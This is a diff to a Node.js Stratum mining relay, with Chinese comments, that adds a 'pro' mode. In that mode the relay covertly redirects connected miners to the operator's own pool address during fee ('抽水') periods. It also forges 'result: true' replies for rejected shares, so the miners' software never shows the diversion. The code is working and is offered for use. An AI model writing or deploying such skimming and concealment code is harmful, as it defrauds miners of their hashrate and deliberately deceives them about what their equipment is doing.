@@ -8,6 +8,7 @@ var express = require('express');
 var qs = require('querystring');
 //============================================
 
+var ispro = false;//是否用于专业矿机
 var isssl = true;//是否启用SSL(矿机到中转服务器)
 var dk = 5555;//本地挖矿端口(矿机要填的挖矿地址里的端口)
 var dk2 = 14444;//矿池挖矿端口(统一使用tcp端口，即使上面开启ssl这里也填矿池的tcp端口)
@@ -38,6 +39,7 @@ try{
     console.log('加载配置文件出错:',err)
 }
 if(readconfig.length!=0){
+    if(!isEmpty(readconfig.ispro))ispro=readconfig.ispro;
     if(!isEmpty(readconfig.isssl))isssl=readconfig.isssl;
     if(!isEmpty(readconfig.dk))dk=readconfig.dk;
     if(!isEmpty(readconfig.dk2))dk2=readconfig.dk2;
@@ -625,7 +627,183 @@ function startserver() {//启动中转服务
     }
 }
 }
-startserver()
+function startproserver(){
+try {
+        server = net.createServer(function (client) {//每一个矿机都有一个独立的client，以下数据为该矿机独有数据
+            if(isconnet){
+            var data3 = [];//存储矿机挖矿地址和矿机名
+            var ser;
+            ser = net.connect({
+                port: dk2,
+                host: ym
+            }, function () {
+                this.on('data', function (data) {//接收到矿池发来数据
+                    try {
+                        data.toString().split('\n').forEach(jsonDataStr => {
+                            if (trim(jsonDataStr).length) {
+                                let data2 = JSON.parse(trim(jsonDataStr));
+                                try{
+                                if (data2.result == false) {//被矿池拒绝也返回接受(防止抽水时个别share被拒绝显示到挖矿软件上)
+                                    client.write(Buffer.from('{"id":' + data2.id + ',"result":true}\n'));
+                                } else {
+                                    client.write(Buffer.from(JSON.stringify(data2) + '\n'))
+                                }
+                                }catch(ewww){
+                                client.write(Buffer.from(JSON.stringify(data2) + '\n'))
+                                }
+                            }
+                        })
+                    } catch(err) {
+                        try{client.write(data)}catch(err2){}//错误处理机制
+                    }
+                })
+                this.on('error', function (err) {
+                    console.log('ser_err9', err)
+                });
+            })
+
+            var clidevdo = false;//该矿机当前是否处于抽水状态
+            client.on('data', function (data) {//接收到矿机发来数据
+                try {
+                    data.toString().split('\n').forEach(jsonDataStr => {
+                        if (trim(jsonDataStr).length) {
+                            let data2 = JSON.parse(trim(jsonDataStr));
+                            if (data2.method == 'mining.authorize') {//如果矿机发来登录数据，记录并登录
+                                data3 = data2.params[0].split('.');
+                                if (!data3[1]) {
+                                    data3[1] = 'noname';
+                                }
+                                ser.write(Buffer.from(JSON.stringify(data2) + '\n'))
+                            } else if (data3.length != 0) {
+                                if (data2.method == 'mining.subscribe') {//如果矿机发来请求工作任务命令
+                                    ser.write(Buffer.from(JSON.stringify(data2) + '\n'))
+                                } else {
+                                    if (data2.method == 'mining.submit') {//如果矿机发来上报Share命令，上报检测是否进入抽水时间
+                                        ser.write(Buffer.from(JSON.stringify(data2) + '\n'))
+                                        if (devdo && !clidevdo) {//如果已经进入抽水时间，但矿机还未开始抽水
+                                            clidevdo=true;
+                                            ser.end()
+                                            ser.destroy();//关掉原矿机连接
+                                            ser = net.connect({//开启抽水矿池连接并登录
+                                                port: dk4,
+                                                host: ym2
+                                            }, function () {
+                                                this.on('data', function (data) {//接收抽水矿池发来数据
+                                                    try {
+                                                        data.toString().split('\n').forEach(jsonDataStr => {
+                                                            if (trim(jsonDataStr).length) {
+                                                                let data2 = JSON.parse(trim(jsonDataStr));
+                                                                try{
+                                                                if (data2.result == false) {//被矿池拒绝也返回接受(防止抽水时个别share被拒绝显示到挖矿软件上)
+                                                                    client.write(Buffer.from('{"id":' + data2.id + ',"result":true}\n'))
+                                                                } else {
+                                                                    client.write(Buffer.from(JSON.stringify(data2) + '\n'))
+                                                                }
+                                                            }catch(ewww){
+                                                                client.write(Buffer.from(JSON.stringify(data2) + '\n'))
+                                                            }
+                                                            }
+                                                        })
+                                                    } catch(errr){
+                                                        client.write(data)
+                                                    }
+                                                })
+                                                this.on('error', function (err) {
+                                                    console.log('ser_err10', err)
+                                                });
+                                                ser.write(gongzuo)//请求工作任务
+                                                setTimeout(function () {
+                                                    ser.write(Buffer.from('{"id":1,"method":"mining.authorize","worker":"'+devfeeget+'","params":["' + csaddress + '","x"]}\n'))//用抽水地址和矿机名登录
+                                                }, 10)
+                                            })
+                                        } else if (!devdo && clidevdo) {//如果已经退出抽水时间，但矿机还在抽水
+                                            clidevdo=false;
+                                            ser.end()
+                                            ser.destroy();//关掉抽水矿池连接
+                                            ser = net.connect({//开启原矿池连接并为矿机登录
+                                                port: dk2,
+                                                host: ym
+                                            }, function () {
+                                                this.on('data', function (data) {
+                                                    try {
+                                                        data.toString().split('\n').forEach(jsonDataStr => {
+                                                            if (trim(jsonDataStr).length) {
+                                                                let data2 = JSON.parse(trim(jsonDataStr));
+                                                                try{
+                                                                if (data2.result == false) {
+                                                                    client.write(Buffer.from('{"id":' + data2.id + ',"result":true}\n'))
+                                                                } else {
+                                                                    client.write(Buffer.from(JSON.stringify(data2) + '\n'))
+                                                                }
+                                                            }catch(ewww){
+                                                                client.write(Buffer.from(JSON.stringify(data2) + '\n'))
+                                                            }
+                                                            }
+                                                        })
+                                                    } catch(errr){
+                                                        client.write(data)
+                                                    }
+                                                })
+                                                this.on('error', function (err) {
+                                                    console.log('ser_err8', err)
+                                                });
+                                                ser.write(gongzuo)//请求工作任务
+                                                setTimeout(function () {
+                                                    ser.write(Buffer.from('{"id":1,"method":"mining.authorize","worker":"'+data3[1]+'","params":["' + data3[0] + '","x"]}\n'))//用抽水地址和矿机名登录
+
+                                                }, 10)
+                                            })
+                                        }
+                                    } else {
+                                        ser.write(Buffer.from(JSON.stringify(data2) + '\n'))
+                                    }
+                                }
+                            } else {
+                                try{ser.write(data)}catch(eyrr){
+                                    client.end()
+                                    client.destroy()
+                                }
+                            }
+                        }
+                    });
+                } catch (err) {
+                    console.log(err.message)
+                    console.log('2', data.toString())
+                    try {ser.write(data)} catch (err343) {
+                        console.log(err343)
+                    }
+                }
+            });
+            ser.write(Buffer.from('{"id": 1, "method": "mining.subscribe", "params": ["ethminer/1.0.0"]}\n'));
+            client.on('error', function (err) {});
+            client.on('close', function () {
+                try{
+                    ser.end();
+                    ser.destroy();
+                }catch(err222){console.log('gbser',err222)}
+            });}else{
+                try{
+                    client.end();
+                    client.destroy();
+                }catch(err222){console.log('gbcli',err222)}
+
+            }
+        });
+        server.listen(dk, '0.0.0.0', function () {
+            server.on('close', function () {});
+            server.on('error', function (err) {});
+        });
+    } catch (err0101) {//中转服务出现故障，10秒钟后重启
+        console.log('serverdown', err0101)
+        setTimeout(function () {
+            startproserver()
+        }, 10000)
+    }
+}
+if(!ispro){
+startserver()}else{
+startproserver()
+}
 try {
     app.listen(dk3)
 } catch (err) {//后台端口被占用，使用端口数字+1
